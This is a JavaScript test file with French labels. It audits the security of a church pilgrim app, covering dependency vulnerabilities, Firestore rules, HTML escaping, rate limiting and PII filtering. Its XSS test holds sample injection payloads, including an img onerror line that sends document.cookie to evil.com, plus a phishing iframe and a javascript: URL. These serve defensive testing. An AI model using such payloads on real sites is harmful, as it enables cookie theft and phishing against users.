import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { execSync } from "node:child_process";
import { escapeHtml, checkInviteRateLimit, sendInviteEmail } from "../src/services/brevoMailer.js";
import { validatePrayerContent, validateCommunityMessage } from "../src/services/moderation.js";

const rootDir = path.resolve();

test("Audit de Sécurité 1: Zéro vulnérabilité dans les dépendances (npm audit / SCA)", () => {
  const auditOutput = execSync("npm audit --json", { cwd: rootDir, encoding: "utf-8" });
  const audit = JSON.parse(auditOutput);
  const vulnTotal = audit.metadata?.vulnerabilities?.total || 0;
  assert.equal(vulnTotal, 0, `Des vulnérabilités subsistent (${vulnTotal} trouvées)`);
});

test("Audit de Sécurité 2: Cloisonnement strict des règles Firestore et protection PII", () => {
  const rulesPath = path.join(rootDir, "firestore.rules");
  assert.ok(fs.existsSync(rulesPath), "Le fichier firestore.rules doit exister");
  const rules = fs.readFileSync(rulesPath, "utf-8");

  // 1. La collection /pelerins/{uid} ne doit JAMAIS autoriser la lecture publique
  assert.ok(!rules.includes("match /pelerins/{uid} {\n      allow read: if true;"), "Les profils privés /pelerins ne doivent pas être lisibles publiquement");
  assert.ok(rules.includes("request.auth != null && request.auth.uid == uid"), "Lecture des pèlerins strictement restreinte au propriétaire");

  // 2. Le carnet spirituel privé doit être strictement hermétique
  assert.ok(rules.includes("match /carnet/{noteId}"), "Règle pour le carnet spirituel");

  // 3. La collection publique /classement_pelerins/{uid} interdit formellement les PII (email, téléphone, carnet)
  assert.ok(rules.includes("match /classement_pelerins/{uid}"), "Collection publique dédiée aux scores");
  assert.ok(rules.includes("!('email' in request.resource.data)"), "Interdiction formelle de stocker l'email dans le classement public");
  assert.ok(rules.includes("!('telephone' in request.resource.data)"), "Interdiction formelle du téléphone dans le classement public");
});

test("Audit de Sécurité 3: Neutralisation des attaques par injection HTML, phishing et XSS mail", async () => {
  // Attaques courantes testées : <script>, balises d'images avec onload/onerror, iframes malveillantes, balises a href
  const vector1 = "<script>alert('pwned')</script>";
  const vector2 = "<img src='x' onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\">";
  const vector3 = "<iframe src='https://phishing-site.example.com'></iframe>";
  const vector4 = "\"><a href='https://attacker.com'>Cliquez ici pour gagner</a>";

  assert.equal(escapeHtml(vector1).includes("<script>"), false);
  assert.equal(escapeHtml(vector1), "&lt;script&gt;alert(&#39;pwned&#39;)&lt;/script&gt;");

  assert.equal(escapeHtml(vector2).includes("<img"), false);
  assert.equal(escapeHtml(vector3).includes("<iframe"), false);
  assert.equal(escapeHtml(vector4).includes("<a"), false);

  // Test de génération d'email avec vecteur d'injection
  const res = await sendInviteEmail({
    toEmail: "victime@example.fr",
    friendName: "<script>hack()</script>",
    inviterName: vector4,
    inviterStats: { xp: 100, pearls: 5, stagesCount: 2 },
    customMessage: "Que la paix soit avec toi 🌿",
    inviteUrl: "javascript:alert(1)" // Tentative de schéma javascript dangereux
  });

  assert.equal(res.success, true);
  assert.equal(res.simulated, true);
});

test("Audit de Sécurité 4: Protection contre les attaques par déni de service et spam (Rate Limiting)", () => {
  // Le rate limiting autorise jusqu'à 3 envois par minute par client
  const res1 = checkInviteRateLimit();
  const res2 = checkInviteRateLimit();
  const res3 = checkInviteRateLimit();
  const res4 = checkInviteRateLimit();

  // Le 4ème appel rapide DOIT impérativement être bloqué pour prévenir le bombardement de spams
  assert.equal(res4.allowed, false, "Le 4ème appel rapide doit être rejeté par le limiteur de débit");
  assert.ok(res4.error.includes("sécurité anti-spam"), "Un message explicite doit notifier le pèlerin");
});

test("Audit de Sécurité 5: Blindage des champs Auteur et Message contre les fuites PII et arnaques", () => {
  // 1. Numéros de téléphone dissimulés dans le nom d'auteur
  const attackAuthor1 = "Jean (06 12 34 56 78)";
  const check1 = validatePrayerContent("Seigneur bénis nos familles", attackAuthor1);
  assert.equal(check1.valid, false, "L'auteur contenant un numéro de téléphone doit être bloqué");

  // 2. Email dissimulé dans l'auteur
  const attackAuthor2 = "contact@pirate-bot.xyz";
  const check2 = validatePrayerContent("Une pensée pour vous", attackAuthor2);
  assert.equal(check2.valid, false, "L'auteur contenant un email doit être bloqué");

  // 3. Lien d'hameçonnage / phishing dans l'auteur
  const attackAuthor3 = "Pèlerin https://arnaque-crypto.com";
  const check3 = validatePrayerContent("Une pensée pour vous", attackAuthor3);
  assert.equal(check3.valid, false, "L'auteur contenant un lien web doit être bloqué");

  // 4. Balises HTML d'injection dans l'auteur
  const attackAuthor4 = "<b>SuperPelerin</b>";
  const check4 = validatePrayerContent("Paix et joie !", attackAuthor4);
  assert.equal(check4.valid, true);
  assert.equal(check4.sanitizedAuthor, "SuperPelerin", "Les balises HTML doivent être automatiquement retirées");
});

test("Audit de Sécurité 6: Immunité aux corruptions LocalStorage et falsification d'URL", () => {
  const mainPath = path.join(rootDir, "src/main.jsx");
  const mainContent = fs.readFileSync(mainPath, "utf-8");

  // Vérification de la sanitization du paramètre URL
  assert.ok(mainContent.includes("slice(0, 35)"), "Le pseudo d'invitation URL doit être tronqué pour éviter le DoS");
  assert.ok(mainContent.includes("replace(/[<>"), "Les caractères d'injection HTML doivent être neutralisés");

  // Vérification du debouncing Firestore pour garantir la fluidité 60fps
  assert.ok(mainContent.includes("setTimeout(() => {"), "syncPelerinProfile doit être debouncé pour éviter le spam réseau");
  assert.ok(mainContent.includes("clearTimeout(timer)"), "Le timer debounce doit être réinitialisé proprement");
});

test("Propriété Officielle: Attribution Église Évangélique Assemblée de la Grâce dans les courriels", () => {
  const brevoPath = path.join(rootDir, "src/services/brevoMailer.js");
  const brevoContent = fs.readFileSync(brevoPath, "utf-8");
  assert.ok(brevoContent.includes("Assemblée de la Grâce"), "La mention de l'Assemblée de la Grâce doit figurer dans les courriels");
  assert.ok(brevoContent.includes("Issia"), "La mention de la ville d'Issia doit figurer dans les courriels");
});
